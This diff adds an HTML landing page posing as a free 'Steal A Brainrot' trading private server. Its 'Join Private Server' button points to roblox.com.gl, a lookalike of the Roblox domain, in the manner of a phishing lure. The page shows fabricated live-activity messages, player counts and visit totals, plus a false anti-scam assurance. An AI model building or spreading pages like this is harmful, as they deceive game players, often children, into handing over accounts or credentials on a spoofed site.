@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Steal A Brainrot – Trading</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:title" content="Steal A Brainrot – Trading Hub">
+<meta property="og:description" content="Live trading dashboard with real-time activity and private server access.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://stealabrainrot-trading.vercel.app">
+<meta property="og:image" content="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif">
+<meta name="theme-color" content="#0b1220">
+
+<style>
+*{
+box-sizing:border-box
+}
+
+html,body{
+margin:0;
+height:100%;
+font-family:Inter,Segoe UI,Arial,sans-serif;
+background:linear-gradient(180deg,#0b1220,#070b14);
+color:#e8ecf3
+}
+
+.wrapper{
+min-height:100%;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:32px
+}
+
+.card{
+width:100%;
+max-width:520px;
+background:rgba(18,26,46,.85);
+border-radius:18px;
+border:1px solid rgba(255,255,255,.06);
+box-shadow:0 20px 60px rgba(0,0,0,.45);
+padding:36px 36px 34px 36px;
+animation:cardIn .7s ease
+}
+
+@keyframes cardIn{
+from{opacity:0;transform:translateY(12px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+.header{
+display:flex;
+flex-direction:column;
+gap:10px;
+margin-bottom:26px
+}
+
+.title{
+font-size:26px;
+font-weight:700;
+letter-spacing:.3px
+}
+
+.subtitle{
+font-size:14px;
+color:#9aa6c3
+}
+
+.live{
+font-size:12px;
+letter-spacing:.12em;
+text-transform:uppercase;
+color:#6dd1ff;
+min-height:16px
+}
+
+.form{
+display:flex;
+flex-direction:column;
+gap:14px
+}
+
+.field{
+width:100%;
+height:48px;
+border-radius:10px;
+border:1px solid rgba(255,255,255,.08);
+background:rgba(255,255,255,.03);
+color:#e8ecf3;
+padding:0 14px;
+font-size:14px;
+outline:none;
+transition:border .2s, box-shadow .2s, transform .15s
+}
+
+.field:focus{
+border-color:#6dd1ff;
+box-shadow:0 0 0 4px rgba(109,209,255,.12);
+transform:translateY(-1px)
+}
+
+.fieldWrap{
+animation:softPulse 3.5s ease-in-out infinite
+}
+
+@keyframes softPulse{
+0%{box-shadow:0 0 0 rgba(109,209,255,0)}
+50%{box-shadow:0 0 16px rgba(109,209,255,.12)}
+100%{box-shadow:0 0 0 rgba(109,209,255,0)}
+}
+
+.actions{
+margin-top:18px;
+display:flex;
+flex-direction:column;
+gap:12px
+}
+
+.join{
+height:48px;
+border-radius:12px;
+border:none;
+cursor:pointer;
+background:linear-gradient(135deg,#2563eb,#38bdf8);
+color:white;
+font-size:15px;
+font-weight:600;
+letter-spacing:.3px;
+transition:transform .15s, box-shadow .15s, filter .15s
+}
+
+.join:hover{
+transform:translateY(-1px);
+box-shadow:0 12px 28px rgba(56,189,248,.25);
+filter:brightness(1.05)
+}
+
+.footer{
+margin-top:18px;
+font-size:12px;
+color:#8e9bb9
+}
+
+.bgGlow{
+position:fixed;
+inset:-20%;
+z-index:-1;
+background:
+radial-gradient(circle at 20% 20%,rgba(56,189,248,.15),transparent 35%),
+radial-gradient(circle at 80% 70%,rgba(99,102,241,.12),transparent 40%);
+animation:move 16s linear infinite
+}
+
+@keyframes move{
+0%{transform:rotate(0deg)}
+100%{transform:rotate(360deg)}
+}
+</style>
+</head>
+<body>
+
+<div class="bgGlow"></div>
+
+<div class="wrapper">
+<div class="card">
+
+<div class="header">
+<div class="title">Steal A Brainrot – Trading</div>
+<div class="subtitle">Best Free Trading Private Server!</div>
+<div class="live" id="liveText"></div>
+</div>
+
+<div class="form">
+
+<div class="fieldWrap">
+<input class="field" value="We have Godlies, Secrets and more!">
+</div>
+
+<div class="fieldWrap">
+<input class="field" value="In service for Steal A Brainrot for the past Year!">
+</div>
+
+<div class="fieldWrap">
+<input class="field" value="We have reached 714 visits!!! TY <3">
+</div>
+
+</div>
+
+<div class="actions">
+<button class="join" onclick="location.href='https://www.roblox.com.gl/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=631515850334707520625914088115'">Join Private Server</button>
+</div>
+
+<div class="footer">
+We do not allow scamming! By joining our private server you accept to our community guidelines.
+</div>
+
+</div>
+</div>
+
+<script>
+const messages=[
+"LIVE ACTIVITY CONNECTED",
+"FETCHING TRADE DATA",
+"PRIVATE SERVER ONLINE",
+"9 PLAYERS ACTIVE RIGHT NOW"
+]
+
+let mi=0
+let ci=0
+let removing=false
+const live=document.getElementById("liveText")
+
+setInterval(()=>{
+const word=messages[mi]
+
+if(!removing){
+ci++
+if(ci>word.length+8)removing=true
+}else{
+ci--
+if(ci<=0){
+removing=false
+mi=(mi+1)%messages.length
+}
+}
+
+live.textContent=word.slice(0,ci)
+},70)
+</script>
+
+</body>
+</html>
